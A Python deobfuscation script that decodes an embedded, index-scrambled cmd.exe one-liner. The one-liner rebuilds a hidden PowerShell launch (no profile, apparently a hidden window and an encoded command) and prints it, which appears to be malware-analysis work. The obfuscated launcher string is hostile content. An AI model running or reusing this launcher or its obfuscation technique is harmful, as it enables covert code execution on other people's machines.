import re

command = r'''cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P& set Text=.& (for %t in (6 24 44 10 51 20 14 28 32 1 44 8 30 1 58 26 37 45 18 44 10 51 20 14 28 32 1 60 28 32 26 40 8 3 26 38 38 44 17 12 27 36 44 53 28 32 26 40 1 3 26 38 38 27 26 50 26 48 25 20 28 53 48 25 32 48 3 48 25 26 20 29 48 5 32 15 23 52 6 52 52 0 52 15 38 52 41 46 52 14 42 52 22 52 21 56 52 16 56 15 56 52 47 1 52 54 56 15 30 52 41 36 52 9 52 52 30 52 47 31 52 35 52 52 59 52 47 43 52 7 42 52 45 52 47 43 52 7 32 52 12 52 6 4 52 7 32 52 49 52 47 7 52 9 52 52 58 52 43 4 52 14 56 15 36 52 43 5 52 54 56 15 1 52 41 31 52 9 52 15 12 52 6 46 52 33 56 15 49 52 41 23 52 13 32 15 58 52 11 7 52 54 56 15 38 52 11 42 52 34 56 15 57 52 6 52 52 2 32 15 53 52 6 52 52 14 56 52 55 52 41 36 52 29 32 15 53 52 6 52 52 2 32 15 50 52 41 46 52 9 52 15 35 52 21 7 52 8 56 15 0 52 43 46 52 31 32 15 31 52 43 43 52 16 52 15 7 52 21 52 52 39 56 15 8 52 21 31 52 31 32 15 21 52 21 9 52 60 56 52 50 52 52 19 19) do set Text=!Text!!Note:~%t,1!) & set Text=!Text:@= !& call !Text:~1!"'''

# Extract Note
note = re.search(
    r'set Note=(.*?)& set Text',
    command
).group(1)

# Extract character indexes
numbers = re.search(
    r'for %t in \((.*?)\) do',
    command
).group(1)

indexes = list(map(int, numbers.split()))

# Reconstruct Text
decoded = ''.join(
    note[i]
    for i in indexes
    if i < len(note)
)

# Same transformation as:
# set Text=!Text:@= !
decoded = decoded.replace("@", " ")

print("========== DECODED PAYLOAD ==========")
print(decoded)
print("======================================")